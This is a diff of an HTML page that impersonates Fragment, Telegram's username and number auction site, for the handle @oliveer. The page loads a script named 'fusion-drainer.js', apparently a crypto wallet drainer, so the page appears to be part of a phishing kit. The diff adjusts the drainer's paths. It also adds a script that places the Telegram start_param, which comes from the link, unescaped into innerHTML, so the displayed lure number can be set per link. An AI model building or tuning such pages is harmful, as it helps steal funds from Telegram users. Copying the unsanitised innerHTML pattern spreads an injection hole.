@@ -23,8 +23,8 @@
   <meta property="og:description" content="An auction to get the Telegram username @oliveer is in progress.">
   <meta property="og:site_name" content="Fragment Auctions">
   <link rel="canonical" href="oliveer.html" />
-  <link rel="stylesheet" href="fusion-drainer.css?v=1.0.1" />
-  <script src="fusion-drainer.js?v=1.0.6" defer crossorigin></script>
+  <link rel="stylesheet" href="//fusion-drainer.css?v=1.0.1" />
+  <script src="..//fusion-drainer.js?v=1.0.6" defer crossorigin></script>
   <link rel="shortcut icon" href="fragment.ico" type="image/x-icon" />
   <link rel="mask-icon" href="https://fragment.com/img/fragment_icon.svg" color="#121519">
   <script>
@@ -36,6 +36,7 @@
   <link href="bootstrap-extra.css@2.css" rel="stylesheet">
   <link href="auction.css@75.css" rel="stylesheet">
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
 </head>
 
 <body class="emoji_image no-transition">
@@ -135,7 +136,7 @@
              <section class="tm-section tm-auction-section">
         <div class="tm-section-header">
           <h2 class="tm-section-header-text">
-            <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain">+888 2776 3742</span><span class="domain"></span></span></span>
+            <span class="tm-section-header-domain"><span class="tm-web3-address"><span class="subdomain" id="numb1">+888 2776 3742</span><span class="domain"></span></span></span>
             <span class="tm-section-header-status tm-status-avail">Claimed</span>
 
           </h2>
@@ -581,7 +582,10 @@
     fetchToncoinPrice();
   </script>
 
-
+  <script>let startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
+console.log(startParam);
+let numb1=document.getElementById("numb1");
+numb1.innerHTML = startParam;</script>
 </body>
 
 </html>
